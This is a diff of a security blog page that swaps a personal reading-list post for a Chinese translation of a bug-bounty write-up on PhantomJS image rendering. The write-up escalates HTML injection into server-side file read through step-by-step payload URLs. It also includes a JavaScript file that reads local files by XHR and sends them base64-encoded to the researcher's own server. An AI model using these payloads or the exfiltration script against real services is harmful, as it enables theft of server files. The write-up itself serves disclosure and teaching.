@@ -74,7 +74,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="life," />
+  <meta name="keywords" content="xss,ssrf,lfi," />
 
 
 
@@ -90,17 +90,27 @@
 
 
 
-<meta name="description" content="未觉池塘春草梦，阶前梧叶已秋声   明天是六一儿童节，对于京东图书来说却是一个超级品牌日，对于各大网购平台来说六月更是一次年中大促的黄金时段…..">
-<meta name="keywords" content="life">
+<meta name="description" content="在一次赏金程序中，我碰见这么一个请求，用户输入然后生成图片供下载。过了一会儿，我便把图片内部的XSS升级成服务端的任意文件读取漏洞。因为程序的隐私性，所以我将尽力抹掉敏感信息。">
+<meta name="keywords" content="xss,ssrf,lfi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="年中总结">
-<meta property="og:url" content="/2017/05/31/children-day/index.html">
+<meta property="og:title" content="【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF&#x2F;LFR">
+<meta property="og:url" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
-<meta property="og:description" content="未觉池塘春草梦，阶前梧叶已秋声   明天是六一儿童节，对于京东图书来说却是一个超级品牌日，对于各大网购平台来说六月更是一次年中大促的黄金时段…..">
-<meta property="og:updated_time" content="2017-05-31T15:56:18.000Z">
+<meta property="og:description" content="在一次赏金程序中，我碰见这么一个请求，用户输入然后生成图片供下载。过了一会儿，我便把图片内部的XSS升级成服务端的任意文件读取漏洞。因为程序的隐私性，所以我将尽力抹掉敏感信息。">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/phantomjs.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/file.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/xss.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/iframe.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/test-1.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/var-location-1.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/local-file-1.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/response.png">
+<meta property="og:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/passwds.png">
+<meta property="og:updated_time" content="2017-07-01T15:47:14.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="年中总结">
-<meta name="twitter:description" content="未觉池塘春草梦，阶前梧叶已秋声   明天是六一儿童节，对于京东图书来说却是一个超级品牌日，对于各大网购平台来说六月更是一次年中大促的黄金时段…..">
+<meta name="twitter:title" content="【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF&#x2F;LFR">
+<meta name="twitter:description" content="在一次赏金程序中，我碰见这么一个请求，用户输入然后生成图片供下载。过了一会儿，我便把图片内部的XSS升级成服务端的任意文件读取漏洞。因为程序的隐私性，所以我将尽力抹掉敏感信息。">
+<meta name="twitter:image" content="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/phantomjs.png">
 
 
 
@@ -128,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="/2017/05/31/children-day/"/>
+  <link rel="canonical" href="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/"/>
 
 
 
 
 
-  <title>年中总结 | Ꭰ's security blog</title>
+  <title>【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF/LFR | Ꭰ's security blog</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -283,7 +293,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="/2017/05/31/children-day/">
+    <link itemprop="mainEntityOfPage" href="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="oTex911">
@@ -300,7 +310,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">年中总结</h1>
+          <h1 class="post-title" itemprop="name headline">【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF/LFR</h1>
         
 
         <div class="post-meta">
@@ -312,8 +322,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-31T23:04:26+08:00">
-                2017-05-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-01T23:47:14+08:00">
+                2017-07-01
               </time>
             
 
@@ -335,8 +345,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/随笔/" itemprop="url" rel="index">
-                    <span itemprop="name">随笔</span>
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
                   </a>
                 </span>
 
@@ -352,7 +362,7 @@
 
           
           
-             <span id="/2017/05/31/children-day/" class="leancloud_visitors" data-flag-title="年中总结">
+             <span id="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" class="leancloud_visitors" data-flag-title="【译】骚年，看我如何把PhantomJS图片的XSS升级成SSRF/LFR">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -380,29 +390,56 @@
       
 
       
-        <blockquote class="blockquote-center"><p>未觉池塘春草梦，阶前梧叶已秋声 </p>
-</blockquote>
-<p><em>明天是六一儿童节，对于京东图书来说却是一个超级品牌日，对于各大网购平台来说六月更是一次年中大促的黄金时段…..</em><br><a id="more"></a></p>
-<p>那么6.1对我来说是什么呢。17年的旅途已经走完了一半，半途风景不错，新伙伴加入、遇到th1s、学长毕业、学长结婚、基友再踏上海求职等等。那这半年我在做什么？</p>
-<ol>
-<li>断断续续的看完了《如何阅读一本书》的前三部分</li>
-<li>读《鸟哥的私房菜》作了一小本笔记，颇为受益</li>
-<li>《深入理解浏览器解析机制和XSS向量编码》反复看了十多遍，终有所获</li>
-</ol>
-<p>半年阅读量不超3本，着实惭愧。</p>
-<p>拟17年下半年读书清单：</p>
-<ol>
-<li>《囚徒健身》</li>
-<li>《学会提问》</li>
-<li>《编程珠玑》</li>
-<li>《数学之美》</li>
-<li>《算法神探》</li>
-<li>《浪潮之巅》</li>
-<li>《SQL注入攻击与防御》</li>
-<li>《国富论》</li>
-<li>《循序渐进Linux》</li>
-</ol>
-<p>愿成。</p>
+        <p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/phantomjs.png" alt="phantomjs"></p>
+<p>在一次赏金程序中，我碰见这么一个请求，用户输入然后生成图片供下载。过了一会儿，我便把图片内部的XSS升级成服务端的任意文件读取漏洞。因为程序的隐私性，所以我将尽力抹掉敏感信息。</p>
+<a id="more"></a>
+<p>原始请求如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=Test&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p>请求返回的文件如下：</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/file.png" alt=""></p>
+<p>最开始我执着于background参数，因为background的值是文件名，我认为这个参数看上去是最有意思的。接着在对参数进行了混淆后，我发现header参数存在HTML注入。因为之前阅读过pdf中xss引起严重漏洞的笔记，所以我决定在这一点上进行深入。</p>
+<p>请求：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header="&gt;&lt;u&gt;test&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p>返回：</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/xss.png" alt="xss"></p>
+<p>接着我尝试了任意HTML元素，结果非常有意思：基本上所有的html元素（iframe、img、script等灯）都被浏览器解析了。为了获取更多关于是什么在处理html的信息，我决定用自己的服务器作为ssrf目标。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;iframe src=https://xss.buer.haus/ssrftest&gt;&lt;/iframe&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/iframe.png" alt="iframe"></p>
+<p>我自己的服务器端日志记录如下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[25/Jun/2017:20:31:49 -0400] "GET /ssrftest HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"</div></pre></td></tr></table></figure>
+<p>从上面的记录可知，请求字段中的UA字段表明了HTML页面的加载和图像的生成是由无UA头浏览器客户端<a href="http://phantomjs.org/" target="_blank" rel="external">PhantomJS</a>来完成的。在Phantom方面，我是颇有经验的，因为CTF比赛中经常能碰到，同时我在自己的网络扫描器使用Phantom完成网站截图功能。知道了是PhantomJS处理HTML，这对于漏洞利用来说这是个好消息，因为这解释了我之前尝试利用漏洞时遇到的一些问题。</p>
+<p>我遇到的第一个问题是基本的payload总是不能执行。比如说<code>&lt;script&gt;</code>不能正常执行、<code>&lt;img src=x onerror=&gt;</code>不会触发。我记得在100次重定向的尝试中就成功了一次。有些情况下，payload根本不执行。除此之外，在尝试重定向到其他页面时还遇到一些服务器异常的情况。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="window.location='https://xss.buer.haus/'" /&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p>响应：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;"message": "Internal server error"&#125;.</div></pre></td></tr></table></figure>
+<p>我尝试了大概50种不同类型的payload才意识到真正的问题是PhantomJS存在某种条件竞争。在给我自己的扫描器编写插件时，我遇到过类似的问题。那是在尝试捕捉截图时，Phantom不会等JavaScript完全加载后才渲染图片。</p>
+<p>所以我必须想个办法在图片渲染前延缓Phantom以完成我js代码的加载。在尝试了几个想法后，我使用了<code>document.write</code>覆盖了图片内容，同时这个函数似乎解决了上面的问题。但是我不知道原理，只知道它起作用了。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write('test')" /&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p>响应:</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/test-1.png" alt="test-1"></p>
+<p>这时，只要页面加载，存储型JavaScript就能执行。接下来我需要收集更多关于PhantomJS和代码执行上下文环境的信息。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="x" onerror="document.write(window.location)" /&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p>响应：</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/var-location-1.png" alt="var-location-1"></p>
+<p>上图的结果非常有意思，我们可以知道代码是从<code>file://</code>执行的，同时得知这是<code>/var/task</code>目录下的一个html文件。这时我想通过<iframe>引入文件来检测是否同源。</iframe></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///var/task/[redacted].html&gt;&lt;/iframe&gt;')"/&gt;&amp;text=&amp;width=500&amp;height=500</div></pre></td></tr></table></figure>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/local-file-1.png" alt="local-file-1"></p>
+<p>现在可以得出结论了，至少<code>/var/task</code>下的任意文件可以被读取，接下来我想看看能否读取其他目录下的文件（比如<code>/etc/</code>目录）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')"/&gt;</div></pre></td></tr></table></figure>
+<p>很尴尬，请求没有返回。</p>
+<p>于是我对<code>/var/tasks</code>目录进行了搜索以便获取更多信息，最后发现这可能和<a href="https://en.wikipedia.org/wiki/AWS_Lambda" target="_blank" rel="external">AWS Lambda</a>有关。这个发现让我将注意力放在了同目录下的某些文件上（比如<code>/var/task/index.js</code>），这些文件应该包含了Phantom插件的源码。所以我认为在<code>/var/</code>下我能访问的文件内容可能会提供更多信息，至少会有一些值得报告的信息。</p>
+<p>理论上使用XHR和Ajax应该能够读取文件内容并在图片中展示或者将内容提取到我的服务器上。但直接通过<code>document.write</code>写入js代码发生了问题，最终我发现可以通过外部脚本来绕过这个问题。</p>
+<p>Payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;header=&lt;img src="xasdasdasd" onerror="document.write('&lt;script src="https://xss.buer.haus/test.js"&gt;&lt;/script&gt;')"/&gt;</div></pre></td></tr></table></figure>
+<p>test.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">reqListener</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> encoded = <span class="built_in">encodeURI</span>(<span class="keyword">this</span>.responseText);</div><div class="line">    <span class="keyword">var</span> b64 = btoa(<span class="keyword">this</span>.responseText);</div><div class="line">    <span class="keyword">var</span> raw = <span class="keyword">this</span>.responseText;</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;iframe src="https://xss.buer.haus/exfil?data='</span>+b64+<span class="string">'"&gt;&lt;/iframe&gt;'</span>);</div><div class="line">&#125; </div><div class="line"><span class="keyword">var</span> oReq = <span class="keyword">new</span> XMLHttpRequest(); </div><div class="line">oReq.addEventListener(<span class="string">"load"</span>, reqListener); </div><div class="line">oReq.open(<span class="string">"GET"</span>, <span class="string">"file:///var/task/[redacted].html"</span>); </div><div class="line">oReq.send();</div></pre></td></tr></table></figure>
+<p>不披露些敏感数据是无法展示战果的，下面这张图仅是你在访问日志里看到的数据。</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/response.png" alt="response"></p>
+<p>现在在<code>file://</code>环境下，可以通过带外JavaScript和XHR来读取任意文件来。所以我用脚本再次读取<code>/etc/passwd</code>去检测<code>iframe</code>是否生效。</p>
+<p><img src="/2017/07/01/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/passwds.png" alt="response"></p>
+<p>啊哈哈！当PhantomJS由于某种原因加载<code>&lt;iframe src=&quot;file://&quot;&gt;</code>时，XHR完全可以访问<code>file://</code>的上下文环境（也就是访问任意文件）。</p>
+<p>在经历这些后，会发现XSS在最初似乎一点价值都没，但是从XSS到LFI却费了很多力气。这是一次非常奇怪的赏金之旅，感觉就像在CTF中找flag而不是试图利用生产服务器。这次我最大的收获是投入到这场伪CTF挑战赛的那些周末实际上都是值得的。</p>
+<p>[Source][<a href="http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="external">http://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</a>]</p>
 
       
     </div>
@@ -432,7 +469,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/life/" rel="tag"># life</a>
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+            <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+          
+            <a href="/tags/lfi/" rel="tag"># lfi</a>
           
         </div>
       
@@ -445,8 +486,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/28/sop-and-jsonp/" rel="next" title="sop、jsonp和cors">
-                <i class="fa fa-chevron-left"></i> sop、jsonp和cors
+              <a href="/2017/07/01/imagemagick-rce-vulnerability/" rel="next" title="【译】Imagemagick远程代码执行漏洞">
+                <i class="fa fa-chevron-left"></i> 【译】Imagemagick远程代码执行漏洞
               </a>
             
           </div>
@@ -454,10 +495,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/06/12/keyboard-symbol/" rel="prev" title="键盘符号英文">
-                键盘符号英文 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
